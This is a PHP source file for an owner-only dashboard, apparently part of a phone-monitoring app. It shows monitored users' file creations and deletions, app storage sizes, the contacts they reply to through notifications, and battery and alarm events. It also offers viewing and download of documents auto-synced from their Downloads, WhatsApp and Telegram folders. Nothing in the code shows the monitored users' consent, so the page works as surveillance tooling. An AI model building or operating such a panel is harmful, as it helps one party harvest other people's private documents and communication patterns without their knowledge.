<?php
require_once __DIR__ . '/_boot.php';
ss_require_owner();
$PAGE_TITLE = 'File Monitor';
$PAGE_SUB   = 'Track downloads, new/deleted files, app storage, replies & phone events';
$PAGE_ICON  = '📁';

$uid = (int)($_GET['user'] ?? 0);
$users = $pdo->query("SELECT id, username, name FROM users WHERE role='user' ORDER BY name")->fetchAll();
$uw = $uid ? "AND user_id=$uid" : "";

// File events
$fileEvents = $pdo->query("SELECT * FROM file_monitor_events WHERE 1 $uw ORDER BY detected_at DESC LIMIT 100")->fetchAll();
$newToday = (int)$pdo->query("SELECT COUNT(*) FROM file_monitor_events WHERE event_type='new' AND DATE(detected_at)=CURDATE() $uw")->fetchColumn();
$delToday = (int)$pdo->query("SELECT COUNT(*) FROM file_monitor_events WHERE event_type='deleted' AND DATE(detected_at)=CURDATE() $uw")->fetchColumn();
$topFolders = $pdo->query("SELECT folder, COUNT(*) c FROM file_monitor_events WHERE event_type='new' $uw GROUP BY folder ORDER BY c DESC LIMIT 6")->fetchAll();

// DB sizes
$dbSizes = $pdo->query("SELECT * FROM app_db_sizes WHERE 1 $uw ORDER BY size_bytes DESC")->fetchAll();

// Notification replies
$replies = $pdo->query("SELECT * FROM notif_reply_events WHERE 1 $uw ORDER BY detected_at DESC LIMIT 60")->fetchAll();
$repliesToday = (int)$pdo->query("SELECT COUNT(*) FROM notif_reply_events WHERE DATE(detected_at)=CURDATE() $uw")->fetchColumn();
$topReplyContacts = $pdo->query("SELECT contact_name, app_name, COUNT(*) c FROM notif_reply_events WHERE 1 $uw GROUP BY contact_name, app_name ORDER BY c DESC LIMIT 10")->fetchAll();

// Phone events (battery, alarm)
$phoneEvents = $pdo->query("SELECT * FROM phone_events WHERE 1 $uw ORDER BY detected_at DESC LIMIT 60")->fetchAll();
$alarmsToday = (int)$pdo->query("SELECT COUNT(*) FROM phone_events WHERE event_type='alarm' AND DATE(detected_at)=CURDATE() $uw")->fetchColumn();
$batteryEvents = (int)$pdo->query("SELECT COUNT(*) FROM phone_events WHERE event_type='battery' $uw")->fetchColumn();

// Synced documents
$docs = $pdo->query("SELECT * FROM synced_documents WHERE 1 $uw ORDER BY synced_at DESC LIMIT 100")->fetchAll();
$totalDocs = (int)$pdo->query("SELECT COUNT(*) FROM synced_documents WHERE 1 $uw")->fetchColumn();

// Single document download
if (isset($_GET['doc_dl']) && $uid > 0) {
    $docId = (int)$_GET['doc_dl'];
    $d = $pdo->prepare("SELECT * FROM synced_documents WHERE id=? AND user_id=?");
    $d->execute([$docId, $uid]);
    $doc = $d->fetch();
    if ($doc && file_exists(__DIR__ . '/../' . $doc['file_path'])) {
        $fp = __DIR__ . '/../' . $doc['file_path'];
        header('Content-Type: ' . ($doc['mime_type'] ?: 'application/octet-stream'));
        header('Content-Disposition: attachment; filename="' . $doc['filename'] . '"');
        header('Content-Length: ' . filesize($fp));
        readfile($fp);
        exit;
    }
}
// View document inline (PDF)
if (isset($_GET['doc_view']) && $uid > 0) {
    $docId = (int)$_GET['doc_view'];
    $d = $pdo->prepare("SELECT * FROM synced_documents WHERE id=? AND user_id=?");
    $d->execute([$docId, $uid]);
    $doc = $d->fetch();
    if ($doc && file_exists(__DIR__ . '/../' . $doc['file_path'])) {
        $fp = __DIR__ . '/../' . $doc['file_path'];
        header('Content-Type: ' . ($doc['mime_type'] ?: 'application/pdf'));
        header('Content-Disposition: inline; filename="' . $doc['filename'] . '"');
        header('Content-Length: ' . filesize($fp));
        readfile($fp);
        exit;
    }
}

$PAGE_TOOLS = '<form method="get" style="display:flex;gap:8px;align-items:center"><select class="sel" name="user" onchange="this.form.submit()"><option value="0">All Users</option>';
foreach ($users as $u) $PAGE_TOOLS .= '<option value="'.(int)$u['id'].'" '.($uid===(int)$u['id']?'selected':'').'>'.ss_admin_h($u['name']).'</option>';
$PAGE_TOOLS .= '</select></form>';

require __DIR__ . '/_dark_head.php';
?>

<!-- Stats -->
<div class="cards">
  <div class="stat"><div class="h"><span class="dot">📥</span> New Files Today</div><div class="v"><?= $newToday ?></div></div>
  <div class="stat"><div class="h"><span class="dot">🗑️</span> Deleted Today</div><div class="v"><?= $delToday ?></div></div>
  <div class="stat"><div class="h"><span class="dot">💬</span> Replies Today</div><div class="v"><?= $repliesToday ?></div></div>
  <div class="stat"><div class="h"><span class="dot">⏰</span> Alarms Today</div><div class="v"><?= $alarmsToday ?></div></div>
  <div class="stat"><div class="h"><span class="dot">📄</span> Documents Synced</div><div class="v"><?= $totalDocs ?></div></div>
</div>

<!-- Synced Documents -->
<div class="panel" style="margin-bottom:16px">
  <h3>📄 Documents (PDF, DOC, XLS, etc.)</h3>
  <p style="color:var(--mut);font-size:.72rem;margin-bottom:10px">Auto-synced from Downloads, Documents, WhatsApp Documents, Telegram Documents</p>
  <?php if(!$docs): ?><div class="empty">No documents synced yet — will appear after phone syncs</div><?php else: ?>
  <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:10px">
    <?php foreach($docs as $doc):
      $ext = strtolower($doc['extension'] ?? '');
      $icon = match($ext) {
          'pdf' => '📕', 'doc','docx' => '📘', 'xls','xlsx' => '📗', 'ppt','pptx' => '📙',
          'txt' => '📝', 'csv' => '📊', 'rtf' => '📃', default => '📄'
      };
      $sizeMB = round(($doc['file_size'] ?? 0) / 1024 / 1024, 1);
      $sizeStr = $sizeMB > 0.1 ? $sizeMB . ' MB' : round(($doc['file_size'] ?? 0) / 1024) . ' KB';
      $isPdf = $ext === 'pdf';
      $hasFile = file_exists(__DIR__ . '/../' . $doc['file_path']);
    ?>
    <div style="background:rgba(255,255,255,.04);border-radius:10px;padding:12px;border:1px solid rgba(255,255,255,.06);display:flex;gap:10px;align-items:center">
      <span style="font-size:32px;flex-shrink:0"><?= $icon ?></span>
      <div style="flex:1;min-width:0">
        <div style="font-size:.8rem;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis" title="<?= ss_admin_h($doc['filename']) ?>"><?= ss_admin_h($doc['filename']) ?></div>
        <div style="font-size:.68rem;color:var(--mut)"><?= ss_admin_h($doc['folder'] ?? '') ?> · <?= $sizeStr ?> · <?= strtoupper($ext) ?></div>
        <div style="font-size:.65rem;color:var(--mut)"><?= date('d M Y H:i', strtotime($doc['synced_at'])) ?></div>
        <?php if($hasFile): ?>
        <div style="margin-top:4px;display:flex;gap:6px">
          <?php if($isPdf): ?>
          <a href="?user=<?= $uid ?>&doc_view=<?= $doc['id'] ?>" target="_blank" style="font-size:.7rem;color:#7C3AED;text-decoration:none;font-weight:600">👁️ View</a>
          <?php endif; ?>
          <a href="?user=<?= $uid ?>&doc_dl=<?= $doc['id'] ?>" style="font-size:.7rem;color:#10B981;text-decoration:none;font-weight:600">⬇️ Download</a>
        </div>
        <?php else: ?>
        <div style="font-size:.65rem;color:#EF4444;margin-top:2px">File not on server yet</div>
        <?php endif; ?>
      </div>
    </div>
    <?php endforeach; ?>
  </div>
  <?php endif; ?>
</div>

<div class="grid g2">
  <!-- App Storage Sizes -->
  <div class="panel">
    <h3>💾 App Storage Sizes</h3>
    <?php if(!$dbSizes): ?><div class="empty">No data yet</div><?php else: ?>
    <?php foreach($dbSizes as $ds):
      $sizeMB = round($ds['size_bytes'] / 1024 / 1024, 1);
      $sizeGB = $sizeMB > 1024 ? round($sizeMB / 1024, 2) . ' GB' : $sizeMB . ' MB';
      $maxS = $dbSizes[0]['size_bytes'] ?: 1;
      $pct = round($ds['size_bytes'] / $maxS * 100);
    ?>
    <div style="padding:8px 0;border-bottom:1px solid var(--line)">
      <div style="display:flex;justify-content:space-between;margin-bottom:4px">
        <span style="font-weight:600;font-size:.82rem"><?= ss_admin_h($ds['label']) ?></span>
        <span style="color:#E8467C;font-weight:700;font-size:.82rem"><?= $sizeGB ?></span>
      </div>
      <div style="background:rgba(255,255,255,.08);border-radius:4px;height:6px;overflow:hidden">
        <div style="height:100%;width:<?= $pct ?>%;background:linear-gradient(90deg,#7C3AED,#E8467C);border-radius:4px"></div>
      </div>
      <div style="color:var(--mut);font-size:.65rem;margin-top:2px">Updated: <?= date('d M H:i', strtotime($ds['checked_at'])) ?></div>
    </div>
    <?php endforeach; endif; ?>
  </div>

  <!-- Top Folders -->
  <div class="panel">
    <h3>📂 Top Folders (New Files)</h3>
    <?php if(!$topFolders): ?><div class="empty">No data yet</div><?php else: ?>
    <?php $maxF = $topFolders[0]['c'] ?? 1; foreach($topFolders as $tf): ?>
    <div style="padding:6px 0;border-bottom:1px solid var(--line)">
      <div style="display:flex;justify-content:space-between;margin-bottom:3px">
        <span style="font-size:.82rem"><?= ss_admin_h($tf['folder']) ?></span>
        <span style="color:#10B981;font-weight:700;font-size:.8rem"><?= $tf['c'] ?></span>
      </div>
      <div style="background:rgba(255,255,255,.08);border-radius:3px;height:4px;overflow:hidden">
        <div style="height:100%;width:<?= round($tf['c']/$maxF*100) ?>%;background:#10B981;border-radius:3px"></div>
      </div>
    </div>
    <?php endforeach; endif; ?>
  </div>
</div>

<!-- Notification Replies -->
<div class="panel" style="margin-top:16px">
  <h3>💬 Notification Replies (Quick Reply from Bar)</h3>
  <p style="color:var(--mut);font-size:.72rem;margin-bottom:10px">Detected when user replies from notification — no message content recorded.</p>
  <?php if(!empty($topReplyContacts)): ?>
  <h4 style="font-size:.82rem;margin:8px 0 6px">Top Contacts Replied To</h4>
  <div style="overflow-x:auto">
    <table style="width:100%;border-collapse:collapse;font-size:.78rem">
      <tr style="color:var(--mut);text-align:left;border-bottom:1px solid var(--line)">
        <th style="padding:6px">Contact</th><th style="padding:6px">App</th><th style="padding:6px">Replies</th>
      </tr>
      <?php foreach($topReplyContacts as $rc): ?>
      <tr style="border-bottom:1px solid var(--line)">
        <td style="padding:6px;font-weight:600"><?= ss_admin_h($rc['contact_name']) ?></td>
        <td style="padding:6px"><?= ss_admin_h($rc['app_name']) ?></td>
        <td style="padding:6px;color:#7C3AED;font-weight:700"><?= $rc['c'] ?></td>
      </tr>
      <?php endforeach; ?>
    </table>
  </div>
  <?php endif; ?>
  <?php if($replies): ?>
  <h4 style="font-size:.82rem;margin:12px 0 6px">Recent Replies</h4>
  <div style="max-height:300px;overflow-y:auto">
    <?php foreach(array_slice($replies, 0, 20) as $r): ?>
    <div style="display:flex;gap:10px;padding:6px 0;border-bottom:1px solid var(--line);align-items:center">
      <span style="font-size:18px">💬</span>
      <div style="flex:1">
        <span style="font-weight:600;font-size:.8rem"><?= ss_admin_h($r['contact_name']) ?></span>
        <span style="color:var(--mut);font-size:.72rem"> · <?= ss_admin_h($r['app_name']) ?></span>
      </div>
      <span style="color:var(--mut);font-size:.68rem"><?= date('d M H:i', strtotime($r['detected_at'])) ?></span>
    </div>
    <?php endforeach; ?>
  </div>
  <?php else: ?><div class="empty">No replies detected yet</div><?php endif; ?>
</div>

<!-- File Events Log -->
<div class="panel" style="margin-top:16px">
  <h3>📁 File Events (New / Deleted)</h3>
  <?php if(!$fileEvents): ?><div class="empty">No file events yet</div><?php else: ?>
  <div style="max-height:500px;overflow-y:auto">
    <table style="width:100%;border-collapse:collapse;font-size:.76rem">
      <tr style="color:var(--mut);text-align:left;border-bottom:1px solid var(--line)">
        <th style="padding:6px">Event</th><th style="padding:6px">File</th><th style="padding:6px">Folder</th><th style="padding:6px">Size</th><th style="padding:6px">Time</th>
      </tr>
      <?php foreach($fileEvents as $fe):
        $icon = $fe['event_type'] === 'new' ? '📥' : '🗑️';
        $color = $fe['event_type'] === 'new' ? '#10B981' : '#EF4444';
        $sizeK = round(($fe['file_size'] ?? 0) / 1024);
        $sizeStr = $sizeK > 1024 ? round($sizeK/1024, 1).' MB' : $sizeK.' KB';
      ?>
      <tr style="border-bottom:1px solid var(--line)">
        <td style="padding:6px"><span style="color:<?= $color ?>;font-weight:700"><?= $icon ?> <?= ucfirst($fe['event_type']) ?></span></td>
        <td style="padding:6px;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="<?= ss_admin_h($fe['file_name']) ?>"><?= ss_admin_h($fe['file_name']) ?></td>
        <td style="padding:6px;color:var(--mut)"><?= ss_admin_h($fe['folder']) ?></td>
        <td style="padding:6px"><?= $sizeStr ?></td>
        <td style="padding:6px;color:var(--mut)"><?= date('d M H:i', strtotime($fe['detected_at'])) ?></td>
      </tr>
      <?php endforeach; ?>
    </table>
  </div>
  <?php endif; ?>
</div>

<!-- Phone Events (Battery, Alarms) -->
<div class="panel" style="margin-top:16px">
  <h3>📱 Phone Events (Battery · Alarms · Reminders)</h3>
  <?php if(!$phoneEvents): ?><div class="empty">No events yet</div><?php else: ?>
  <div style="max-height:400px;overflow-y:auto">
    <?php foreach($phoneEvents as $pe):
      $eIcon = match($pe['event_type']) { 'battery' => '🔋', 'alarm' => '⏰', 'reminder' => '📝', default => '📱' };
    ?>
    <div style="display:flex;gap:10px;padding:7px 0;border-bottom:1px solid var(--line);align-items:center">
      <span style="font-size:20px"><?= $eIcon ?></span>
      <div style="flex:1">
        <span style="font-weight:600;font-size:.8rem"><?= ss_admin_h($pe['title'] ?: ucfirst($pe['event_type'])) ?></span>
        <?php if($pe['detail']): ?><div style="color:var(--mut);font-size:.7rem"><?= ss_admin_h($pe['detail']) ?></div><?php endif; ?>
      </div>
      <span style="color:var(--mut);font-size:.68rem"><?= date('d M H:i', strtotime($pe['detected_at'])) ?></span>
    </div>
    <?php endforeach; ?>
  </div>
  <?php endif; ?>
</div>

<?php require __DIR__ . '/_dark_foot.php';
